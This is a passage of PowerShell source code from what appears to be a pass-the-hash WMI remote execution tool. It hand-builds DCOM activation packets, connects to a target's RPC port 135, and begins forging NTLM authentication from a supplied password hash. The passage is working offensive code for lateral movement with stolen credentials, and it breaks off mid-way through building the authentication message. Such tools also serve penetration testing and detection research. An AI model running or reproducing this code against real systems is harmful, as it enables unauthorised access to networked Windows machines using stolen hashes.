    $packet_DCOMRemoteCreateInstance.Add("DCOMVersionMinor",[Byte[]](0x07,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMFlags",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMReserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMCausalityID",$packet_causality_ID)
    $packet_DCOMRemoteCreateInstance.Add("Unknown",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("Unknown2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("Unknown3",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("Unknown4",$packet_cntdata)
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCntData",$packet_cntdata)
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesOBJREFSignature",[Byte[]](0x4d,0x45,0x4f,0x57))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesOBJREFFlags",[Byte[]](0x04,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesOBJREFIID",[Byte[]](0xa2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFCLSID",[Byte[]](0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFCBExtension",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFSize",$packet_size)
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesTotalSize",$packet_total_size)
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesReserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderPrivateHeader",[Byte[]](0xb0,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderTotalSize",$packet_total_size)
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderCustomHeaderSize",[Byte[]](0xc0,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderReserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesDestinationContext",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesNumActivationPropertyStructs",[Byte[]](0x06,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsInfoClsid",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesNULLPointer",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrMaxCount",[Byte[]](0x06,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid",[Byte[]](0xb9,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid2",[Byte[]](0xab,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid3",[Byte[]](0xa5,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid4",[Byte[]](0xa6,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid5",[Byte[]](0xa4,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid6",[Byte[]](0xaa,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrMaxCount",[Byte[]](0x06,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize",[Byte[]](0x68,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize2",[Byte[]](0x58,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize3",[Byte[]](0x90,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize4",$packet_property_data_size)
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize5",[Byte[]](0x20,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize6",[Byte[]](0x30,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPrivateHeader",[Byte[]](0x58,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesSessionID",[Byte[]](0xff,0xff,0xff,0xff))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesRemoteThisSessionID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesClientImpersonating",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPartitionIDPresent",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesDefaultAuthnLevel",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPartitionGuid",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesProcessRequestFlags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesOriginalClassContext",[Byte[]](0x14,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesFlags",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesReserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesUnusedBuffer",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoPrivateHeader",[Byte[]](0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInstantiatedObjectClsId",[Byte[]](0x5e,0xf0,0xc3,0x8b,0x6b,0xd8,0xd0,0x11,0xa0,0x75,0x00,0xc0,0x4f,0xb6,0x88,0x20))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoClassContext",[Byte[]](0x14,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoActivationFlags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoFlagsSurrogate",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInterfaceIdCount",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInstantiationFlag",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsPtr",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationEntirePropertySize",[Byte[]](0x58,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationVersionMajor",[Byte[]](0x05,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationVersionMinor",[Byte[]](0x07,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsPtrMaxCount",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIds",[Byte[]](0x18,0xad,0x09,0xf3,0x6a,0xd8,0xd0,0x11,0xa0,0x75,0x00,0xc0,0x4f,0xb6,0x88,0x20))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsUnusedBuffer",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoPrivateHeader",[Byte[]](0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientOk",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved3",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextUnknown",[Byte[]](0x60,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextCntData",[Byte[]](0x60,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFSignature",[Byte[]](0x4d,0x45,0x4f,0x57))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFFlags",[Byte[]](0x04,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFIID",[Byte[]](0xc0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFCLSID",[Byte[]](0x3b,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFCBExtension",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFSize",[Byte[]](0x30,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoUnusedBuffer",[Byte[]](0x01,0x00,0x01,0x00,0x63,0x2c,0x80,0x2a,0xa5,0xd2,0xaf,0xdd,0x4d,0xc4,0xbb,0x37,0x4d,0x37,0x76,0xd7,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoPrivateHeader",$packet_private_header)
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoAuthenticationFlags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoReserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoReserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameMaxCount",$packet_target_length)
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameActualCount",$packet_target_length)
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameString",$packet_target_unicode)
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoPrivateHeader",[Byte[]](0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoProcessID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoApartmentID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoContextID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoPrivateHeader",[Byte[]](0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestClientImpersonationLevel",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestNumProtocolSequences",[Byte[]](0x01,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestUnknown",[Byte[]](0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrMaxCount",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrProtocolSeq",[Byte[]](0x07,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoUnusedBuffer",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00))

    return $packet_DCOMRemoteCreateInstance
}

function Get-UInt16DataLength
{
    param ([Int]$Start,[Byte[]]$Data)

    $data_length = [System.BitConverter]::ToUInt16($Data[$Start..($Start + 1)],0)

    return $data_length
}

if($hash -like "*:*")
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}

if($Domain)
{
    $output_username = $Domain + "\" + $Username
}
else
{
    $output_username = $Username
}

if($Target -eq 'localhost')
{
    $Target = "127.0.0.1"
}

try
{
    $target_type = [IPAddress]$Target
    $target_short = $target_long = $Target
}
catch
{
    $target_long = $Target

    if($Target -like "*.*")
    {
        $target_short_index = $Target.IndexOf(".")
        $target_short = $Target.Substring(0,$target_short_index)
    }
    else
    {
        $target_short = $Target
    }

}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
$process_ID = $process_ID -replace "-00-00",""
[Byte[]]$process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
Write-Verbose "Connecting to $Target`:135"
$WMI_client_init = New-Object System.Net.Sockets.TCPClient
$WMI_client_init.Client.ReceiveTimeout = 30000

try
{
    $WMI_client_init.Connect($Target,"135")
}
catch
{
    Write-Output "[-] $Target did not respond"
}

if($WMI_client_init.Connected)
{
    $WMI_client_stream_init = $WMI_client_init.GetStream()
    $WMI_client_receive = New-Object System.Byte[] 2048
    $RPC_UUID = 0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a
    $packet_RPC = New-PacketRPCBind 2 0xd0,0x16 0x02 0x00,0x00 $RPC_UUID 0x00,0x00
    $packet_RPC["FragLength"] = 0x74,0x00    
    $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
    $WMI_client_send = $RPC
    $WMI_client_stream_init.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
    $WMI_client_stream_init.Flush()    
    $WMI_client_stream_init.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
    $assoc_group = $WMI_client_receive[20..23]
    $packet_RPC = New-PacketRPCRequest 0x03 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x05,0x00
    $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
    $WMI_client_send = $RPC
    $WMI_client_stream_init.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
    $WMI_client_stream_init.Flush()    
    $WMI_client_stream_init.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
    $WMI_hostname_unicode = $WMI_client_receive[42..$WMI_client_receive.Length]
    $WMI_hostname = [System.BitConverter]::ToString($WMI_hostname_unicode)
    $WMI_hostname_index = $WMI_hostname.IndexOf("-00-00-00")
    $WMI_hostname = $WMI_hostname.SubString(0,$WMI_hostname_index)
    $WMI_hostname = $WMI_hostname -replace "-00",""
    $WMI_hostname = $WMI_hostname.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $WMI_hostname = New-Object System.String ($WMI_hostname,0,$WMI_hostname.Length)

    if($target_short -cne $WMI_hostname)
    {
        Write-Verbose "WMI reports target hostname as $WMI_hostname"
        $target_short = $WMI_hostname
    }

    $WMI_client_init.Close()
    $WMI_client_stream_init.Close()
    $WMI_client = New-Object System.Net.Sockets.TCPClient
    $WMI_client.Client.ReceiveTimeout = 30000

    try
    {
        $WMI_client.Connect($target_long,"135")
    }
    catch
    {
        Write-Output "[-] $target_long did not respond"
    }

    if($WMI_client.Connected)
    {
        $WMI_client_stream = $WMI_client.GetStream()
        $RPC_UUID = 0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46
        $packet_RPC = New-PacketRPCBind 3 0xd0,0x16 0x01 0x01,0x00 $RPC_UUID 0x00,0x00
        $packet_RPC["FragLength"] = 0x78,0x00
        $packet_RPC["AuthLength"] = 0x28,0x00
        $packet_RPC["NegotiateFlags"] = 0x07,0x82,0x08,0xa2
        $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
        $WMI_client_send = $RPC
        $WMI_client_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
        $WMI_client_stream.Flush()    
        $WMI_client_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
        $assoc_group = $WMI_client_receive[20..23]
        $WMI_NTLMSSP = [System.BitConverter]::ToString($WMI_client_receive)
        $WMI_NTLMSSP = $WMI_NTLMSSP -replace "-",""
        $WMI_NTLMSSP_index = $WMI_NTLMSSP.IndexOf("4E544C4D53535000")
        $WMI_NTLMSSP_bytes_index = $WMI_NTLMSSP_index / 2
        $WMI_domain_length = Get-UInt16DataLength ($WMI_NTLMSSP_bytes_index + 12) $WMI_client_receive
        $WMI_target_length = Get-UInt16DataLength ($WMI_NTLMSSP_bytes_index + 40) $WMI_client_receive
        $WMI_session_ID = $WMI_client_receive[44..51]
        $WMI_NTLM_challenge = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 24)..($WMI_NTLMSSP_bytes_index + 31)]
        $WMI_target_details = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 56 + $WMI_domain_length)..($WMI_NTLMSSP_bytes_index + 55 + $WMI_domain_length + $WMI_target_length)]
        $WMI_target_time_bytes = $WMI_target_details[($WMI_target_details.Length - 12)..($WMI_target_details.Length - 5)]
        $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
        $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $auth_hostname = (get-childitem -path env:computername).Value
        $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
        $auth_domain = $Domain
        $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_domain)
        $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
        $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
        $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
        $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)[0,1]
        $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)[0,1]
        $auth_domain_offset = 0x40,0x00,0x00,0x00
        $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
        $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
